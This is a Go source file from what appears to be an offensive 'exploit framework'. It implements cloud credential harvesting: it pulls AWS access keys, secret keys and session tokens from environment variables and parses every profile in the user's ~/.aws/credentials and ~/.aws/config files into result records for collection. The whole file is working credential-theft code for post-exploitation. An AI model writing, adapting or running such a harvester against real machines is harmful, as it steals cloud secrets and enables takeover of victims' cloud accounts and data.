package cloud

import (
	"bufio"
	"os"
	"path/filepath"
	"strings"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestAWS reads AWS credential files and environment variables.
// IMDS instance profile credentials are handled by harvestIMDS. Cross-platform.
func harvestAWS(method string) []*pb.CloudHarvestResult {
	var results []*pb.CloudHarvestResult

	switch method {
	case "creds", "cli":
		if r := harvestAWSCredFiles(); r != nil {
			results = append(results, r)
		}
	case "env_vars":
		if r := harvestAWSEnvVars(); r != nil {
			results = append(results, r)
		}
	case "imds":
		// IMDS requires context; handled by cloud.go via harvestIMDS
	case "all":
		if r := harvestAWSEnvVars(); r != nil {
			results = append(results, r)
		}
		if r := harvestAWSCredFiles(); r != nil {
			results = append(results, r)
		}
	default:
		if r := harvestAWSEnvVars(); r != nil {
			results = append(results, r)
		}
		if r := harvestAWSCredFiles(); r != nil {
			results = append(results, r)
		}
	}

	return results
}

func harvestAWSEnvVars() *pb.CloudHarvestResult {
	accessKey := os.Getenv("AWS_ACCESS_KEY_ID")
	secretKey := os.Getenv("AWS_SECRET_ACCESS_KEY")
	sessionToken := os.Getenv("AWS_SESSION_TOKEN")

	if accessKey == "" {
		return nil
	}

	return &pb.CloudHarvestResult{
		Provider: "aws",
		Method:   "env_vars",
		Credentials: []*pb.CloudCredential{
			{
				Provider: "aws",
				CredType: "access_key",
				Identity: accessKey,
				Secret:   secretKey,
				Extra:    sessionToken,
				Source:   "environment_variables",
			},
		},
	}
}

func harvestAWSCredFiles() *pb.CloudHarvestResult {
	home, _ := os.UserHomeDir()
	result := &pb.CloudHarvestResult{
		Provider: "aws",
		Method:   "credential_files",
	}

	credPaths := []string{
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".aws", "config"),
	}

	found := false
	for _, path := range credPaths {
		creds := parseAWSCredentialFile(path)
		if len(creds) > 0 {
			result.Credentials = append(result.Credentials, creds...)
			found = true
		}
	}

	if !found {
		return nil
	}
	return result
}

// parseAWSCredentialFile parses INI-format AWS credential/config files.
func parseAWSCredentialFile(path string) []*pb.CloudCredential {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	var creds []*pb.CloudCredential
	var currentProfile string
	var accessKey, secretKey, sessionToken string

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Profile header
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			// Save previous profile
			if currentProfile != "" && accessKey != "" {
				creds = append(creds, &pb.CloudCredential{
					Provider: "aws",
					CredType: "access_key",
					Identity: accessKey,
					Secret:   secretKey,
					Extra:    sessionToken,
					Source:   filepath.Base(path) + " [" + currentProfile + "]",
				})
			}

			currentProfile = strings.TrimPrefix(strings.TrimSuffix(line, "]"), "[")
			currentProfile = strings.TrimPrefix(currentProfile, "profile ")
			accessKey, secretKey, sessionToken = "", "", ""
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		switch key {
		case "aws_access_key_id":
			accessKey = value
		case "aws_secret_access_key":
			secretKey = value
		case "aws_session_token":
			sessionToken = value
		}
	}

	// M7: Check scanner error after loop
	if err := scanner.Err(); err != nil {
		return creds // return whatever we parsed so far
	}

	// L2: Save last profile even if it has an access key
	if currentProfile != "" && accessKey != "" {
		creds = append(creds, &pb.CloudCredential{
			Provider: "aws",
			CredType: "access_key",
			Identity: accessKey,
			Secret:   secretKey,
			Extra:    sessionToken,
			Source:   filepath.Base(path) + " [" + currentProfile + "]",
		})
	}

	return creds
}
